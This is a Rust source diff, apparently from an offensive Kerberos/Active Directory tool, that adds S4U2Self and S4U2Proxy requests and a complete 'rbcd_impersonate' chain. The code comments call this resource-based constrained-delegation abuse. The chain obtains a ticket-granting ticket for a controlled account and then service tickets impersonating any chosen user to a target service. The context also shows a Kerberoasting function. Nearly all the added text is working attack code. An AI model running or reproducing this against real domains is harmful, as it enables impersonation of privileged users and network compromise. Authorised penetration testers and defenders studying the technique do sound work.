@@ -16,10 +16,14 @@ use anyhow::{anyhow, bail, Result};
 
 use picky_asn1::bit_string::BitString;
 use picky_asn1::wrapper::{
-    Asn1SequenceOf, BitStringAsn1, ExplicitContextTag0, ExplicitContextTag1, ExplicitContextTag2,
-    ExplicitContextTag3, ExplicitContextTag4, ExplicitContextTag5, ExplicitContextTag7,
-    ExplicitContextTag8, IntegerAsn1, OctetStringAsn1, Optional,
+    Asn1SequenceOf, BitStringAsn1, ExplicitContextTag0, ExplicitContextTag1, ExplicitContextTag11,
+    ExplicitContextTag2, ExplicitContextTag3, ExplicitContextTag4, ExplicitContextTag5,
+    ExplicitContextTag7, ExplicitContextTag8, GeneralStringAsn1, IntegerAsn1, OctetStringAsn1,
+    Optional,
 };
+use picky_krb::crypto::{Checksum as ChecksumTrait, ChecksumSuite};
+use picky_krb::data_types::{Checksum, PaPacOptions};
+use serde::Serialize;
 use picky_krb::constants::key_usages::{AS_REP_ENC, TGS_REQ_PA_DATA_AP_REQ_AUTHENTICATOR};
 use picky_krb::constants::types::{
     AP_REQ_MSG_TYPE, AS_REQ_MSG_TYPE, NT_PRINCIPAL, NT_SRV_INST, PA_ENC_TIMESTAMP_KEY_USAGE,
@@ -339,4 +343,193 @@ pub async fn roast_spn(tgt: &Tgt, sam: &str, spn: &str, kdc: &str) -> Result<Str
     } else {
         crate::format_tgs_aes(sam, &tgt.crealm, spn, etype as u8, cipher)
     })
+}
+
+// ---------------------------------------------------------------------------
+// S4U (MS-SFU): S4U2Self + S4U2Proxy — the RBCD / constrained-delegation abuse.
+// ---------------------------------------------------------------------------
+
+const PA_TGS_REQ: u8 = 0x01;
+const KERB_NON_KERB_CKSUM_SALT: i32 = 17;
+
+/// PA-FOR-USER (MS-SFU §2.2.1): identifies the user to impersonate, keyed to the TGT.
+#[derive(Serialize)]
+struct PaForUser {
+    user_name: ExplicitContextTag0<PrincipalName>,
+    user_realm: ExplicitContextTag1<GeneralStringAsn1>,
+    cksum: ExplicitContextTag2<Checksum>,
+    auth_package: ExplicitContextTag3<GeneralStringAsn1>,
+}
+
+/// Human-readable KDC error from a response that failed to parse as the expected reply.
+fn krb_err(resp: &[u8]) -> String {
+    match picky_asn1_der::from_bytes::<KrbError>(resp) {
+        Ok(err) => format!("KDC error {}", err.0.error_code.0),
+        Err(e) => format!("decode: {e}"),
+    }
+}
+
+/// The AP-REQ (authenticator under the TGT session key) wrapped as PA-TGS-REQ — the
+/// authentication padata every TGS-REQ carries.
+fn ap_req_padata(tgt: &Tgt) -> Result<PaData> {
+    let session = aes256();
+    let authenticator = Authenticator::from(AuthenticatorInner {
+        authenticator_bno: ExplicitContextTag0::from(IntegerAsn1(vec![5])),
+        crealm: ExplicitContextTag1::from(krb_string(&tgt.crealm)),
+        cname: ExplicitContextTag2::from(tgt.cname.clone()),
+        cksum: Optional::from(None),
+        cusec: ExplicitContextTag4::from(IntegerAsn1(vec![0])),
+        ctime: ExplicitContextTag5::from(now_kerberos_time()),
+        subkey: Optional::from(None),
+        seq_number: Optional::from(None),
+        authorization_data: Optional::from(None),
+    });
+    let auth_der = picky_asn1_der::to_vec(&authenticator).map_err(|e| anyhow!("authenticator: {e}"))?;
+    let enc_auth = session
+        .encrypt(&tgt.session_key, TGS_REQ_PA_DATA_AP_REQ_AUTHENTICATOR, &auth_der)
+        .map_err(|e| anyhow!("encrypt authenticator: {e}"))?;
+    let ap_req = ApReq::from(ApReqInner {
+        pvno: ExplicitContextTag0::from(IntegerAsn1(vec![5])),
+        msg_type: ExplicitContextTag1::from(IntegerAsn1(vec![AP_REQ_MSG_TYPE])),
+        ap_options: ExplicitContextTag2::from(BitStringAsn1::from(BitString::with_bytes(vec![0, 0, 0, 0]))),
+        ticket: ExplicitContextTag3::from(tgt.ticket.clone()),
+        authenticator: ExplicitContextTag4::from(encrypted_data(crate::ETYPE_AES256, enc_auth)),
+    });
+    let ap_der = picky_asn1_der::to_vec(&ap_req).map_err(|e| anyhow!("AP-REQ: {e}"))?;
+    Ok(PaData {
+        padata_type: ExplicitContextTag1::from(IntegerAsn1(vec![PA_TGS_REQ])),
+        padata_data: ExplicitContextTag2::from(OctetStringAsn1(ap_der)),
+    })
+}
+
+/// Assemble a TGS-REQ with the given sname, padata, kdc-options and additional tickets.
+fn build_tgs_req(
+    realm: &str,
+    sname: PrincipalName,
+    padatas: Vec<PaData>,
+    options: [u8; 4],
+    additional: Vec<picky_krb::data_types::Ticket>,
+    etypes: &[u8],
+) -> picky_krb::messages::TgsReq {
+    let add = if additional.is_empty() {
+        Optional::from(None)
+    } else {
+        Optional::from(Some(ExplicitContextTag11::from(Asn1SequenceOf::from(additional))))
+    };
+    let body = KdcReqBody {
+        kdc_options: ExplicitContextTag0::from(BitStringAsn1::from(BitString::with_bytes(options.to_vec()))),
+        cname: Optional::from(None),
+        realm: ExplicitContextTag2::from(krb_string(realm)),
+        sname: Optional::from(Some(ExplicitContextTag3::from(sname))),
+        from: Optional::from(None),
+        till: ExplicitContextTag5::from(crate::far_future_time()),
+        rtime: Optional::from(None),
+        nonce: ExplicitContextTag7::from(nonce()),
+        etype: ExplicitContextTag8::from(Asn1SequenceOf::from(
+            etypes.iter().map(|e| IntegerAsn1(vec![*e])).collect::<Vec<_>>(),
+        )),
+        addresses: Optional::from(None),
+        enc_authorization_data: Optional::from(None),
+        additional_tickets: add,
+    };
+    TgsReq::from(KdcReq {
+        pvno: ExplicitContextTag1::from(IntegerAsn1(vec![5])),
+        msg_type: ExplicitContextTag2::from(IntegerAsn1(vec![TGS_REQ_MSG_TYPE])),
+        padata: Optional::from(Some(ExplicitContextTag3::from(Asn1SequenceOf::from(padatas)))),
+        req_body: ExplicitContextTag4::from(body),
+    })
+}
+
+fn pa_for_user(tgt: &Tgt, impersonate: &str) -> Result<PaData> {
+    // S4U checksum input: LE(name-type) || username || realm || auth-package.
+    let mut s4u = Vec::new();
+    s4u.extend_from_slice(&(NT_PRINCIPAL as i32).to_le_bytes());
+    s4u.extend_from_slice(impersonate.as_bytes());
+    s4u.extend_from_slice(tgt.crealm.as_bytes());
+    s4u.extend_from_slice(b"Kerberos");
+    let cksum = ChecksumSuite::HmacSha196Aes256
+        .hasher()
+        .checksum(&tgt.session_key, KERB_NON_KERB_CKSUM_SALT, &s4u)
+        .map_err(|e| anyhow!("PA-FOR-USER checksum: {e}"))?;
+
+    let pfu = PaForUser {
+        user_name: ExplicitContextTag0::from(principal(NT_PRINCIPAL, &[impersonate])),
+        user_realm: ExplicitContextTag1::from(krb_string(&tgt.crealm)),
+        cksum: ExplicitContextTag2::from(Checksum {
+            cksumtype: ExplicitContextTag0::from(IntegerAsn1(vec![16])), // HMAC-SHA1-96-AES256
+            checksum: ExplicitContextTag1::from(OctetStringAsn1(cksum)),
+        }),
+        auth_package: ExplicitContextTag3::from(krb_string("Kerberos")),
+    };
+    Ok(PaData {
+        padata_type: ExplicitContextTag1::from(IntegerAsn1(vec![0x00, 0x81])), // PA-FOR-USER = 129
+        padata_data: ExplicitContextTag2::from(OctetStringAsn1(
+            picky_asn1_der::to_vec(&pfu).map_err(|e| anyhow!("PA-FOR-USER encode: {e}"))?,
+        )),
+    })
+}
+
+/// S4U2Self: obtain a service ticket to our own account *as* `impersonate`.
+pub async fn s4u2self(tgt: &Tgt, self_sam: &str, impersonate: &str, kdc: &str) -> Result<picky_krb::data_types::Ticket> {
+    let req = build_tgs_req(
+        &tgt.crealm,
+        principal(NT_PRINCIPAL, &[self_sam]),
+        vec![ap_req_padata(tgt)?, pa_for_user(tgt, impersonate)?],
+        [0x40, 0x01, 0x00, 0x00], // forwardable | canonicalize
+        vec![],
+        &[crate::ETYPE_AES256],
+    );
+    let resp = kdc_exchange(kdc, &picky_asn1_der::to_vec(&req).map_err(|e| anyhow!("S4U2Self encode: {e}"))?).await?;
+    let rep: TgsRep = picky_asn1_der::from_bytes(&resp).map_err(|_| anyhow!("S4U2Self failed: {}", krb_err(&resp)))?;
+    Ok(rep.0.ticket.0.clone())
+}
+
+/// PA-PAC-OPTIONS advertising Resource-Based Constrained Delegation (bit 3) — required so
+/// the KDC uses the RBCD path in S4U2Proxy instead of classic KCD (else KDC_ERR_BADOPTION).
+fn pa_pac_options_rbcd() -> Result<PaData> {
+    let opts = PaPacOptions {
+        flags: ExplicitContextTag0::from(BitStringAsn1::from(BitString::with_bytes(vec![0x10, 0, 0, 0]))),
+    };
+    Ok(PaData {
+        padata_type: ExplicitContextTag1::from(IntegerAsn1(vec![0x00, 0xa7])), // PA-PAC-OPTIONS = 167
+        padata_data: ExplicitContextTag2::from(OctetStringAsn1(
+            picky_asn1_der::to_vec(&opts).map_err(|e| anyhow!("PA-PAC-OPTIONS encode: {e}"))?,
+        )),
+    })
+}
+
+/// S4U2Proxy: use the S4U2Self ticket as an additional ticket to get a service ticket to
+/// `target_spn` as the impersonated user (the RBCD payoff).
+pub async fn s4u2proxy(tgt: &Tgt, self_ticket: picky_krb::data_types::Ticket, target_spn: &str, kdc: &str) -> Result<picky_krb::data_types::Ticket> {
+    let parts: Vec<&str> = target_spn.split('/').collect();
+    let req = build_tgs_req(
+        &tgt.crealm,
+        principal(NT_SRV_INST, &parts),
+        vec![ap_req_padata(tgt)?, pa_pac_options_rbcd()?],
+        [0x40, 0x03, 0x00, 0x00], // forwardable | cname-in-addl-tkt | canonicalize
+        vec![self_ticket],
+        &[crate::ETYPE_AES256, ETYPE_RC4_HMAC],
+    );
+    let resp = kdc_exchange(kdc, &picky_asn1_der::to_vec(&req).map_err(|e| anyhow!("S4U2Proxy encode: {e}"))?).await?;
+    let rep: TgsRep = picky_asn1_der::from_bytes(&resp).map_err(|_| anyhow!("S4U2Proxy failed: {}", krb_err(&resp)))?;
+    Ok(rep.0.ticket.0.clone())
+}
+
+/// Full RBCD chain: TGT for the controlled account → S4U2Self(impersonate) → S4U2Proxy to
+/// the target service. Returns the etype of the final impersonation ticket as proof.
+pub async fn rbcd_impersonate(
+    account: &str,
+    password: &str,
+    realm: &str,
+    kdc: &str,
+    impersonate: &str,
+    target_spn: &str,
+) -> Result<u32> {
+    let bare = account.split('@').next().unwrap_or(account);
+    let bare = bare.rsplit('\\').next().unwrap_or(bare);
+    let tgt = get_tgt(account, password, realm, kdc).await?;
+    let self_ticket = s4u2self(&tgt, bare, impersonate, kdc).await?;
+    let svc_ticket = s4u2proxy(&tgt, self_ticket, target_spn, kdc).await?;
+    let etype = svc_ticket.0.enc_part.0.etype.0 .0.iter().fold(0u32, |a, &b| (a << 8) | b as u32);
+    Ok(etype)
 }
